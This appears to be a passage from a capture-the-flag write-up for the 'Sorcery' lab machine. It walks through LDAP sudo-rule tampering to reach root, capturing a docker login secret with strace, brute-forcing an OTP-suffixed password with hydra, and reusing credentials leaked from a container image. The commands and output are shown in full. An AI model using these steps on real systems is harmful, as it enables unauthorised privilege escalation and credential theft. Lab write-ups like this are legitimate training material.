Using these inferences, maybe we can use Ash's initial permission to add Ash to sysadmin, which has access to manage sudo roles, which means maybe we can also add Ash to allow_sudo, and then try to sudo?

```sh
# Our initial foothold ldiff
ash_winter@main:~$ cat elevate.ldiff 
dn: cn=sysadmins,cn=groups,cn=accounts,dc=sorcery,dc=htb
changetype: modify
add: member
member: uid=ash_winter,cn=users,cn=accounts,dc=sorcery,dc=htb

# Our sudo access ldiff
ash_winter@main:~$ cat allowsudo.ldiff
dn: ipaUniqueID=cd848e9c-96eb-11ef-b154-0242ac170002,cn=sudorules,cn=sudo,dc=sorcery,dc=htb
changetype: modify
add: memberUser
memberUser: uid=ash_winter,cn=users,cn=accounts,dc=sorcery,dc=htb

# Applying the foothold
ash_winter@main:~$ ldapmodify -f elevate.ldiff 
SASL/GSSAPI authentication started
SASL username: ash_winter@SORCERY.HTB
SASL SSF: 256
SASL data security layer installed.
modifying entry "cn=sysadmins,cn=groups,cn=accounts,dc=sorcery,dc=htb"

# Applying the sudo
ash_winter@main:~$ ldapmodify -f allowsudo.ldiff
SASL/GSSAPI authentication started
SASL username: ash_winter@SORCERY.HTB
SASL SSF: 256
SASL data security layer installed.
modifying entry "ipaUniqueID=cd848e9c-96eb-11ef-b154-0242ac170002,cn=sudorules,cn=sudo,dc=sorcery,dc=htb"

# Here's the new permission set for allow_sudo
ash_winter@main:~$ ldapsearch | grep -C 20 ash_winter 
...
# cd848e9c-96eb-11ef-b154-0242ac170002, sudorules, sudo, sorcery.htb
dn: ipaUniqueID=cd848e9c-96eb-11ef-b154-0242ac170002,cn=sudorules,cn=sudo,dc=s
 orcery,dc=htb
cn: allow_sudo
hostCategory: all
cmdCategory: all
ipaSudoRunAsUserCategory: all
ipaSudoRunAsGroupCategory: all
objectClass: ipaassociation
objectClass: ipasudorule
ipaEnabledFlag: TRUE
ipaUniqueID: cd848e9c-96eb-11ef-b154-0242ac170002
memberUser: uid=admin,cn=users,cn=accounts,dc=sorcery,dc=htb
memberUser: uid=ash_winter,cn=users,cn=accounts,dc=sorcery,dc=htb
...

# Wait a few seconds for it to replicate, maybe sudo systemctl restart sssd to really hammer home your new privileges as you already have access to do so:

ash_winter@main:~$ sudo su root
[sudo] password for ash_winter: 
Password expired. Change your password now.
sudo: Account or password is expired, reset your password and try again
Current Password: 
New password: 
Retype new password: 
root@main:/home/ash_winter# cd /root/
root@main:~# ls
root.txt
root@main:~# cat root.txt
be8ba6d63a4ef1158369914e114d61b1
root@main:~# 

## Bonus Round!

```sh
tom_summers@main:~$ netstat -tulpn
(No info could be read for "-p": geteuid()=2001 but you should be root.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:636           0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:5000          0.0.0.0:*               LISTEN      -   # Interesting port here! Lots of other docker references, maybe this is a default docker registry                
tcp        0      0 127.0.0.1:88            0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:389           0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:464           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:443             0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.54:53           0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::443                  :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
udp        0      0 127.0.0.54:53           0.0.0.0:*                           -                   
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   
udp        0      0 0.0.0.0:68              0.0.0.0:*                           -                   
udp        0      0 127.0.0.1:88            0.0.0.0:*                           -                   
udp        0      0 127.0.0.1:323           0.0.0.0:*                           -                   
udp        0      0 127.0.0.1:464           0.0.0.0:*                           -                   
udp6       0      0 ::1:323                 :::*                                -  

tom_summers@main:~$ curl http://127.0.0.1:5000/v2/_catalog
{"errors":[{"code":"UNAUTHORIZED","message":"authentication required","detail":[{"Type":"registry","Class":"","Name":"catalog","Action":"*"}]}]}
```
```sh
tom_summers@main:~$ ps -ef | grep registry
165536      2275    1992  0 Jun20 ?        00:00:08 registry serve /etc/docker/registry/config.yml

# In linpeas process output:
tom_sum+    1445  0.0  0.7 227012 60700 ?        S    Jun20   0:00 /usr/bin/Xvfb :1 -fbdir /xorg/xvfb -screen 0 512x256x24 -nolisten local
tom_summers@main:/xorg/xvfb$ ls -alhn
total 524K
drwxr-xr-x 2 2002 2002 4.0K Jun 20 03:40 .
drwxr-xr-x 3    0    0 4.0K Apr 28 12:07 ..
-rwxr--r-- 1 2002 2002 516K Jun 20 03:40 Xvfb_screen0
```
SCP this file locally
Necessary to crop the image to just the bytes that copilot calculated I should need based on the type (4 * 512 * 256 for rgba)
```sh
[nix-shell:~/ctf/htb/season8/week5-sorcery/exfil]$ head -c 524288 Xvfb_screen0 > frame.raw

[nix-shell:~/ctf/htb/season8/week5-sorcery/exfil]$ magick -size 512x256 -depth 8 rgba:frame.raw screenshot.png

![image.png](../../../assets/images/ctf/events/season8-htb-25/2025-06-21-week5-sorcery.md/2025-06-21-week5-sorcery/image.png)
```
### Tom_Summers_Admin
Sudo has the docker login option and strace, both super userful!

```sh
(.venv)  /certificate  ssh tom_summers_admin@sorcery.htb -L 5000:localhost:5000
tom_summers_admin@main:~$ sudo -l
Matching Defaults entries for tom_summers_admin on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User tom_summers_admin may run the following commands on localhost:
    (rebecca_smith) NOPASSWD: /usr/bin/docker login
    (rebecca_smith) NOPASSWD: /usr/bin/strace -s 128 -p [0-9]*
```
After some initial sleuthing, I decided to just go for it, what world does this not want me to just tias (Try it and see):
```sh
tom_summers_admin@main:~$ sudo /usr/bin/strace -s 128 -p 2275

# Do this all in one copy/paste
sudo -u rebecca_smith /usr/bin/docker login &
sleep .1
pid=$(pgrep -u rebecca_smith docker | tail -n1)
sudo -u rebecca_smith /usr/bin/strace -s 128 -p "$pid"

#stdout dumps this:
write(33, "{\"Username\":\"rebecca_smith\",\"Secret\":\"-7eAZDp9-f9mg\"}\n", 54) = 54
```

After trying to log into the local docker registry for a minute and failing, I just try to SU...

### Rebecca_smith

```sh
tom_summers_admin@main:~$ su rebecca_smith
Password: 
rebecca_smith@main:/home/tom_summers_admin$ whoami
rebecca_smith
rebecca_smith@main:~$ docker login
This account might be protected by two-factor authentication
In case login fails, try logging in with <password><otp>
```
It took me too long to think to try this, but by adding -L 5000:localhost:5000 to the ssh command, I can use my local hydra to try to brute force this OTP as long as there's no fail2ban-esque protections...
```sh
(.venv)   touch passwordlist                                    
(.venv)   for i in {000000..999999}; do echo '-7eAZDp9-f9mg'$i >> passwordlist; done
(.venv)   head -n 10 passwordlist                     
-7eAZDp9-f9mg000000
-7eAZDp9-f9mg000001
-7eAZDp9-f9mg000002
-7eAZDp9-f9mg000003
-7eAZDp9-f9mg000004
-7eAZDp9-f9mg000005
-7eAZDp9-f9mg000006
-7eAZDp9-f9mg000007
-7eAZDp9-f9mg000008
-7eAZDp9-f9mg000009
(.venv)   hydra -l rebecca_smith -P passwordlist localhost -s 5000 http-get /v2/_catalog
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
```
I cheated here since I had root already and went to get the OTP of the hour rather than wait the 3+ hours of trying this command. The really annoying part of this is that if your connection is slow like mine, there's a real chance the password changes before you finish enumerating the passwords. May need to find a more efficient way to test these passwords since there's nothing stopping multiple connections at a time.

If the password changes mid-pull, you have to start over as well :|
```sh
(.venv)   hydra -t 64 -l rebecca_smith -P passwordlist localhost -s 5000 http-get /v2/_catalog -I
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-06-21 00:01:52
[WARNING] Restorefile (ignored ...) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 1 task per 1 server, overall 1 task, 1 login try (l:1/p:1), ~1 try per task
[DATA] attacking http-get://localhost:5000/v2/_catalog
[5000][http-get] host: localhost   login: rebecca_smith   password: -7eAZDp9-f9mg659549
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-06-21 00:01:53
```
With the password we can now simply use the token to look at the list of available images.
```sh
(.venv)   docker login localhost:5000 -u rebecca_smith 
Password: 
WARNING! Your password will be stored unencrypted in /home/tokugero/.docker/config.json.
Configure a credential helper to remove this warning. See
https://docs.docker.com/engine/reference/commandline/login/#credential-stores

Login Succeeded
(.venv)   cat ~/.docker/config.json | jq -r '.auths["localhost:5000"].auth'
cmViZWNjYV9zbWl0aDotN2VBWkRwOS1mOW1nNjU5NTQ5
(.venv)   curl -H "Authorization: Basic cmViZWNjYV9zbWl0aDotN2VBWkRwOS1mOW1nNjU5NTQ5" http://localhost:5000/v2/_catalog
{"repositories":["test-domain-workstation"]}
```
And with the images pulled (hopefully it doesn't take too many tries)...
```sh
(.venv)   docker pull localhost:5000/test-domain-workstation

Using default tag: latest
latest: Pulling from test-domain-workstation
802008e7f761: Downloading [==>                                                ]   1.31MB/30.61MB
92879ec47383: Downloading [==>                                                ]  1.638MB/29.98MB
bff382edc3a6: Downloading [>                                                  ]  1.114MB/100.6MB
292e59a87dfb: Waiting 
```
And just check some basic files in the container:
```sh
(.venv)   docker run --rm -it localhost:5000/test-domain-wor
kstation bash
root@94c2b12164c4:/# env
HOSTNAME=94c2b12164c4
PWD=/
HOME=/root
LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=00:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.avif=01;35:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.webp=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:*~=00;90:*#=00;90:*.bak=00;90:*.crdownload=00;90:*.dpkg-dist=00;90:*.dpkg-new=00;90:*.dpkg-old=00;90:*.dpkg-tmp=00;90:*.old=00;90:*.orig=00;90:*.part=00;90:*.rej=00;90:*.rpmnew=00;90:*.rpmorig=00;90:*.rpmsave=00;90:*.swp=00;90:*.tmp=00;90:*.ucf-dist=00;90:*.ucf-new=00;90:*.ucf-old=00;90:
TERM=xterm
SHLVL=1
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
_=/usr/bin/env
root@94c2b12164c4:/# ls
bin                dev                   home               lib64  opt   run                 srv  usr
bin.usr-is-merged  docker-entrypoint.sh  lib                media  proc  sbin                sys  var
boot               etc                   lib.usr-is-merged  mnt    root  sbin.usr-is-merged  tmp
root@94c2b12164c4:/# cat docker-entrypoint.sh 
#!/bin/bash

ipa-client-install --unattended --principal donna_adams --password 3FEVPCT_c3xDH \
    --server dc01.sorcery.htb --domain sorcery.htb --no-ntp --force-join --mkhomedir
```

```sh
(.venv)   ssh donna_adams@sorcery.htb
(donna_adams@sorcery.htb) Password: 
Creating directory '/home/donna_adams'.
Welcome to Ubuntu 24.04.2 LTS (GNU/Linux 6.8.0-60-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

-sh: 32: [[: not found
-sh: 32: Sat Jun 21 07:18:52 2025: not found
Last login: Sat Jun 21 07:18:52 2025 from 10.10.14.31
$ bash
donna_adams@main:~$ 
```

## Donna_Adams

No sudo -L, no interesting files in home (probably because it was just made)

```sh
donna_adams@main:~$ ipa hbacrule-find --all
--------------------
2 HBAC rules matched
--------------------
  dn: ipaUniqueID=c4f41b80-96eb-11ef-9cbc-0242ac170002,cn=hbac,dc=sorcery,dc=htb
  Rule name: allow_ssh
  Enabled: True
  Users: donna_adams, ash_winter, admin
  Hosts: main.sorcery.htb
  HBAC Services: sshd
  accessruletype: allow
  ipauniqueid: c4f41b80-96eb-11ef-9cbc-0242ac170002
  objectclass: ipaassociation, ipahbacrule

  dn: ipaUniqueID=c54549ba-96eb-11ef-9408-0242ac170002,cn=hbac,dc=sorcery,dc=htb
  Rule name: allow_sudo
  Enabled: True
  Users: donna_adams, ash_winter, admin
  Hosts: main.sorcery.htb
  HBAC Services: sudo
  accessruletype: allow
  ipauniqueid: c54549ba-96eb-11ef-9408-0242ac170002
  objectclass: ipaassociation, ipahbacrule
----------------------------
Number of entries returned 2
----------------------------
```
But Donna should have SOME permissions in sudo based on this.


```sh
donna_adams@main:~$ ldapsearch -Y gssapi
...
# donna_adams, users, accounts, sorcery.htb
dn: uid=donna_adams,cn=users,cn=accounts,dc=sorcery,dc=htb
givenName: donna
sn: adams
uid: donna_adams
cn: donna adams
displayName: donna adams
initials: da
gecos: donna adams
krbPrincipalName: donna_adams@SORCERY.HTB
krbPasswordExpiration: 20400101000000Z
objectClass: top
objectClass: person
objectClass: organizationalperson
objectClass: inetorgperson
objectClass: inetuser
objectClass: posixaccount
objectClass: krbprincipalaux
objectClass: krbticketpolicyaux
objectClass: ipaobject
objectClass: ipasshuser
objectClass: ipaSshGroupOfPubKeys
objectClass: mepOriginEntry
objectClass: ipantuserattrs
loginShell: /bin/sh
homeDirectory: /home/donna_adams
mail: donna_adams@sorcery.htb
krbCanonicalName: donna_adams@SORCERY.HTB
ipaUniqueID: c60a9328-96eb-11ef-ace5-0242ac170002
uidNumber: 1638400003
gidNumber: 1638400003
ipaNTSecurityIdentifier: S-1-5-21-820725746-4072777037-1046661441-1003
memberOf: cn=ipausers,cn=groups,cn=accounts,dc=sorcery,dc=htb
memberOf: cn=change_userPassword_ash_winter_ldap,cn=roles,cn=accounts,dc=sorce
 ry,dc=htb
memberOf: cn=change_userPassword_ash_winter_ldap,cn=privileges,cn=pbac,dc=sorc
 ery,dc=htb
memberOf: cn=change_userPassword_ash_winter_ldap,cn=permissions,cn=pbac,dc=sor
 cery,dc=htb
memberOf: ipaUniqueID=c4f41b80-96eb-11ef-9cbc-0242ac170002,cn=hbac,dc=sorcery,
 dc=htb
memberOf: ipaUniqueID=c54549ba-96eb-11ef-9408-0242ac170002,cn=hbac,dc=sorcery,
 dc=htb

...
```
And a simple use of the change_userPassword permission I assume is in there...
```sh
donna_adams@main:~$ ipa user-mod ash_winter --password
Password: 
Enter Password again to verify: 
--------------------------
Modified user "ash_winter"
--------------------------
  User login: ash_winter
  First name: ash
  Last name: winter
  Home directory: /home/ash_winter
  Login shell: /bin/sh
  Principal name: ash_winter@SORCERY.HTB
  Principal alias: ash_winter@SORCERY.HTB
  Email address: ash_winter@sorcery.htb
  UID: 1638400004
  GID: 1638400004
  Account disabled: False
  Password: True
  Member of groups: ipausers
  Member of HBAC rule: allow_ssh, allow_sudo
  Indirect Member of role: add_sysadmin
  Kerberos keys available: True
```
```sh
(.venv)   ssh ash_winter@sorcery.htb 
(ash_winter@sorcery.htb) Password: 
Password expired. Change your password now.
(ash_winter@sorcery.htb) Current Password: 
(ash_winter@sorcery.htb) New password: 
BAD PASSWORD: The password is the same as the old one
(ash_winter@sorcery.htb) New password: 
(ash_winter@sorcery.htb) Retype new password: 
Welcome to Ubuntu 24.04.2 LTS (GNU/Linux 6.8.0-60-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

-sh: 32: [[: not found
-sh: 32: Sat Jun 21 07:39:01 2025: not found
Last login: Sat Jun 21 07:39:01 2025 from 10.10.14.31
$ bash
ash_winter@main:~$ 
```


Finally you can go back to the rest of my original solution!
